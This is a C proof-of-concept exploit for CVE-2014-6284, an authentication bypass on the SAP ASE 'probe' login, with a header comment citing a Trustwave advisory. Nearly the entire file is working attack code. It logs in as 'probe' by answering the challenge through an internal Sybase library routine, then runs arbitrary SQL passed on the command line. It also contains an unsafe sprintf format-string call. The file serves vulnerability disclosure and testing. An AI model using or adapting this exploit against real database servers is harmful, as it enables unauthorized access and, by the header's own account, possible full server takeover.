/*
**    probe.c by Martin Rakhmanov 2015-04-23
**
**    Finding: SAP ASE "probe" login access vulnerability
**    CVE: CVE-2014-6284
**
**    SAP ASE ships with a login named "probe" used for the two-phase commit probe process, 
**    which uses a challenge and response mechanism to access Adaptive Server. There is a flaw in
**    implementation of the challenge and response mechanism that allows anyone to access the server
**    as "probe" login. While the "probe" is not a privileged account, other flaws exist that allow
**    privilege elevation from regular database user to database administrator. Combined with such privilege 
**    elevation vulnerabilities this one allows complete takeover of the database server.
**
**    More information is available at https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-004/?fid=6200
**
**    cl /nologo /c probe.c
**    link /nologo /defaultlib:%SYBASE%\OCS-15_0\lib\libsybct.lib /defaultlib:%SYBASE%\OCS-15_0\lib\libsybcs.lib probe.obj
*/
#include <ctpublic.h>
#include <stdio.h>
#include <windows.h>

#define MAX_COMMAND_SIZE 4096

CS_CHAR *Ex_server   = "ROME";
CS_CHAR *Ex_username = "probe";

CS_CONTEXT	*Ex_context;

typedef int (__stdcall *PCOM_UNINITIALIZE_TDS_TEXT)(CS_CONNECTION *connection, CS_BYTE *inbuf, CS_INT maxlength, CS_BYTE *outbuf, CS_INT *outbufoutlen);

CS_VOID CS_PUBLIC
ex_error(char *msg)
{
	fprintf(stderr, "ERROR: %s\n", msg);
	fflush(stderr);
}

CS_RETCODE CS_PUBLIC
ex_execute_cmd(CS_CONNECTION *connection, CS_CHAR *cmdbuf)
{
	CS_RETCODE      retcode;
	CS_INT          restype;
	CS_COMMAND      *cmd;
	CS_RETCODE      query_code;

	/*
	** Get a command handle, store the command string in it, and
	** send it to the server.
	*/
	if ((retcode = ct_cmd_alloc(connection, &cmd)) != CS_SUCCEED)
	{
		ex_error("ex_execute_cmd: ct_cmd_alloc() failed");
		return retcode;
	}

	if ((retcode = ct_command(cmd, CS_LANG_CMD, cmdbuf, CS_NULLTERM,
			CS_UNUSED)) != CS_SUCCEED)
	{
		ex_error("ex_execute_cmd: ct_command() failed");
		(void)ct_cmd_drop(cmd);
		return retcode;
	}

	if ((retcode = ct_send(cmd)) != CS_SUCCEED)
	{
		ex_error("ex_execute_cmd: ct_send() failed");
		(void)ct_cmd_drop(cmd);
		return retcode;
	}

	/*
	** Examine the results coming back. If any errors are seen, the query
	** result code (which we will return from this function) will be
	** set to FAIL.
	*/
	query_code = CS_SUCCEED;
	while ((retcode = ct_results(cmd, &restype)) == CS_SUCCEED)
	{
		switch((int)restype)
		{
		    case CS_CMD_SUCCEED:
		    case CS_CMD_DONE:
			break;

		    case CS_CMD_FAIL:
			query_code = CS_FAIL;
			break;

		    case CS_STATUS_RESULT:
		    case CS_ROW_RESULT:
			retcode = ct_cancel(NULL, cmd, CS_CANCEL_CURRENT);
			if (retcode != CS_SUCCEED)
			{
				ex_error("ex_execute_cmd: ct_cancel() failed");
				query_code = CS_FAIL;
			}
			break;

		    default:
			/*
			** Unexpected result type.
			*/
			query_code = CS_FAIL;
			break;
		}
		if (query_code == CS_FAIL)
		{
			/*
			** Terminate results processing and break out of
			** the results loop
			*/
			retcode = ct_cancel(NULL, cmd, CS_CANCEL_ALL);
			if (retcode != CS_SUCCEED)
			{
				ex_error("ex_execute_cmd: ct_cancel() failed");
			}
			break;
		}
	}

	/*
	** Clean up the command handle used
	*/
	if (retcode == CS_END_RESULTS)
	{
		retcode = ct_cmd_drop(cmd);
		if (retcode != CS_SUCCEED)
		{
			query_code = CS_FAIL;
		}
	}
	else
	{
		(void)ct_cmd_drop(cmd);
		query_code = CS_FAIL;
	}

	if (query_code == CS_FAIL)
	{
		ex_error("ex_execute_cmd: The following command caused an error:");
		ex_error(cmdbuf);
	}
	return query_code;
}

CS_RETCODE CS_PUBLIC
ex_clientmsg_cb(CS_CONTEXT *context, CS_CONNECTION *connection, CS_CLIENTMSG *errmsg)
{

	/*
	** Suppress the 'cursor before first' and 'cursor after last' messages.
	** These are informational messages but come with "external error" string
	** potentially confusing users. These messages are related to the scrollable
	** cursor examples.
	*/
	if ((CS_NUMBER(errmsg->msgnumber) == 211) || (CS_NUMBER(errmsg->msgnumber) == 212))
	{
		return CS_SUCCEED;
	}

	fprintf(stderr, "\nOpen Client Message:\n");
	fprintf(stderr, "Message number: LAYER = (%d) ORIGIN = (%d) ",
		CS_LAYER(errmsg->msgnumber), CS_ORIGIN(errmsg->msgnumber));
	fprintf(stderr, "SEVERITY = (%d) NUMBER = (%d)\n",
		CS_SEVERITY(errmsg->msgnumber), CS_NUMBER(errmsg->msgnumber));
	fprintf(stderr, "Message String: %s\n", errmsg->msgstring);
	if (errmsg->osstringlen > 0)
	{
		fprintf(stderr, "Operating System Error: %s\n",
			errmsg->osstring);
	}
	fflush(stderr);

	return CS_SUCCEED;
}

/*
** ex_servermsg_cb()
**
** Type of function:
** 	example program server message handler
**
** Purpose:
** 	Installed as a callback into Open Client.
**
** Returns:
** 	CS_SUCCEED
**
** Side Effects:
** 	None
*/
CS_RETCODE CS_PUBLIC
ex_servermsg_cb(CS_CONTEXT *context, CS_CONNECTION *connection, CS_SERVERMSG *srvmsg)
{
	/*
	** Ignore the 'Changed database to' and 'Changed language to'
	** messages.
	*/
	if ((srvmsg->msgnumber == 5701) || (srvmsg->msgnumber == 5703))
	{
		return CS_SUCCEED;
	}

	fprintf(stderr, "\nServer message:\n");
	fprintf(stderr, "Message number: %d, Severity %d, ",
		srvmsg->msgnumber, srvmsg->severity);
	fprintf(stderr, "State %d, Line %d\n",
		srvmsg->state, srvmsg->line);

	if (srvmsg->svrnlen > 0)
	{
		fprintf(stderr, "Server '%s'\n", srvmsg->svrname);
	}

	if (srvmsg->proclen > 0)
	{
		fprintf(stderr, " Procedure '%s'\n", srvmsg->proc);
	}

	fprintf(stderr, "Message String: %s\n", srvmsg->text);
	fflush(stderr);

	return CS_SUCCEED;
}

CS_RETCODE CS_PUBLIC
ex_init(CS_CONTEXT **context)
{
	CS_RETCODE	retcode;
	CS_INT		netio_type = CS_SYNC_IO;

	/*
	** Get a context handle to use.
	*/
	retcode = cs_ctx_alloc(CS_CURRENT_VERSION, context);
	if (retcode != CS_SUCCEED)
	{
		ex_error("ex_init: cs_ctx_alloc() failed");
		return retcode;
	}

	/*
	** Initialize Open Client.
	*/
	retcode = ct_init(*context, CS_CURRENT_VERSION);
	if (retcode != CS_SUCCEED)
	{
		ex_error("ex_init: ct_init() failed");
		cs_ctx_drop(*context);
		*context = NULL;
		return retcode;
	}

	/*
	** Install client and server message handlers.
	*/
	if (retcode == CS_SUCCEED)
	{
		retcode = ct_callback(*context, NULL, CS_SET, CS_CLIENTMSG_CB,
					(CS_VOID *)ex_clientmsg_cb);
		if (retcode != CS_SUCCEED)
		{
			ex_error("ex_init: ct_callback(clientmsg) failed");
		}
	}

	if (retcode == CS_SUCCEED)
	{
		retcode = ct_callback(*context, NULL, CS_SET, CS_SERVERMSG_CB,
				(CS_VOID *)ex_servermsg_cb);
		if (retcode != CS_SUCCEED)
		{
			ex_error("ex_init: ct_callback(servermsg) failed");
		}
	}

	if (retcode != CS_SUCCEED)
	{
		ct_exit(*context, CS_FORCE_EXIT);
		cs_ctx_drop(*context);
		*context = NULL;
	}

	return retcode;
}

CS_RETCODE CS_PUBLIC
ex_con_cleanup(CS_CONNECTION *connection, CS_RETCODE status)
{
	CS_RETCODE	retcode;
	CS_INT		close_option;

	close_option = (status != CS_SUCCEED) ? CS_FORCE_CLOSE : CS_UNUSED;
	retcode = ct_close(connection, close_option);
	if (retcode != CS_SUCCEED)
	{
		ex_error("ex_con_cleanup: ct_close() failed");
		return retcode;
	}
	retcode = ct_con_drop(connection);
	if (retcode != CS_SUCCEED)
	{
		ex_error("ex_con_cleanup: ct_con_drop() failed");
		return retcode;
	}

	return retcode;
}

CS_RETCODE CS_PUBLIC
ex_ctx_cleanup(CS_CONTEXT *context, CS_RETCODE status)
{
	CS_RETCODE	retcode;
	CS_INT		exit_option;

	exit_option = (status != CS_SUCCEED) ? CS_FORCE_EXIT : CS_UNUSED;
	retcode = ct_exit(context, exit_option);
	if (retcode != CS_SUCCEED)
	{
		ex_error("ex_ctx_cleanup: ct_exit() failed");
		return retcode;
	}
	retcode = cs_ctx_drop(context);
	if (retcode != CS_SUCCEED)
	{
		ex_error("ex_ctx_cleanup: cs_ctx_drop() failed");
		return retcode;
	}
	return retcode;
}


CS_RETCODE CS_PUBLIC
	real_response_cb(
	CS_CONNECTION      *connection,
	CS_INT             inmsgid,
	CS_INT             *outmsgid,
	CS_DATAFMT         *inbuffmt,
	CS_BYTE            *inbuf,
	CS_DATAFMT         *outbuffmt,
	CS_BYTE            *outbuf,
	CS_INT             *outbufoutlen)
{
	HANDLE hLib = NULL;
	PCOM_UNINITIALIZE_TDS_TEXT com_uninitialize_tds_text;

	hLib = LoadLibrary("libsybcomn.dll");
	if(hLib == NULL)
	{
		fprintf(stderr, "Failed to load Sybase Common-Library\n");
		return CS_FAIL;
	}

	com_uninitialize_tds_text = (PCOM_UNINITIALIZE_TDS_TEXT)GetProcAddress(hLib, "com_uninitialize_tds_text");
	if(com_uninitialize_tds_text == NULL)
	{
		fprintf(stderr, "Failed to locate the com_uninitialize_tds_text routine\n");
		return CS_FAIL;
	}

	*outmsgid = 0x05;
	outbuffmt->datatype = CS_BINARY_TYPE;
	return com_uninitialize_tds_text(connection, inbuf, inbuffmt->maxlength, outbuf, outbufoutlen) == 1;
}

int main(int argc, char *argv[])
{
	CS_CONNECTION	*connection;
	CS_RETCODE	retcode;
	CS_INT		len;
	CS_INT		prpvalue;
	CS_CHAR     *cmdbuf;
	CS_INT sec_challenge = 1;

	fprintf(stdout, "SAP Sybase ASE 'probe' login connection POC\n");
	fflush(stdout);

	if(argc != 2)
	{
		fprintf(stdout, "Usage: %s SQL\n", argv[0]);
		fflush(stdout);
		return CS_SUCCEED;
	}

	/*
	** Allocate a context structure and initialize Client-Library
	*/
	retcode = ex_init(&Ex_context);
	if (retcode != CS_SUCCEED)
	{
		fprintf(stderr, "FATAL ERROR\n");
		fflush(stderr);
		return CS_FAIL;
	}

	/*
	** Allocate a connection structure.
	*/
	retcode = ct_con_alloc(Ex_context, &connection);
	if (retcode != CS_SUCCEED)
	{
		ex_error("ct_con_alloc failed");
		return retcode;
	}

	if (retcode == CS_SUCCEED && Ex_username != NULL)
	{
		if ((retcode = ct_con_props(connection, CS_SET, CS_USERNAME,
			Ex_username, CS_NULLTERM, NULL)) != CS_SUCCEED)
		{
			ex_error("ct_con_props(Ex_username) failed");
		}
	}

	if (retcode == CS_SUCCEED)
	{
		if ((retcode = ct_con_props(connection, CS_SET, CS_SEC_CHALLENGE,
			&sec_challenge, CS_UNUSED, NULL)) != CS_SUCCEED)
		{
			ex_error("ct_con_props(CS_SEC_CHALLENGE) failed");
		}
	}

	if(ct_callback(NULL, connection, CS_SET, CS_CHALLENGE_CB, real_response_cb) != CS_SUCCEED)
	{
		ex_error("ct_callback() failed\n");
	}

	if (retcode == CS_SUCCEED)
	{
		len = (Ex_server == NULL) ? 0 : CS_NULLTERM;
		retcode = ct_connect(connection, Ex_server, len);
		if (retcode != CS_SUCCEED)
		{
			ex_error("ct_connect failed");
		}
		else
		{
			fprintf(stdout, "Connection to the server succeed.\n");
			fflush(stdout);
		}
	}

	/*
	** Allocate the buffer for the command string.
	*/
	cmdbuf = (CS_CHAR *) malloc(MAX_COMMAND_SIZE);
	if (cmdbuf == (CS_CHAR *)NULL)
	{
		ex_error("malloc() failed");
		return CS_FAIL;
	}

	sprintf(cmdbuf, argv[1]);
	fprintf(stdout, "About to execute: %s\n", cmdbuf);
	if ((retcode = ex_execute_cmd(connection, cmdbuf)) != CS_SUCCEED)
	{
		ex_error("command execution failed");
		free (cmdbuf);
		return retcode;
	}

	if (connection != NULL)
	{
		retcode = ex_con_cleanup(connection, retcode);
	}

	if (Ex_context != NULL)
	{
		retcode = ex_ctx_cleanup(Ex_context, retcode);
	}

	return retcode;
}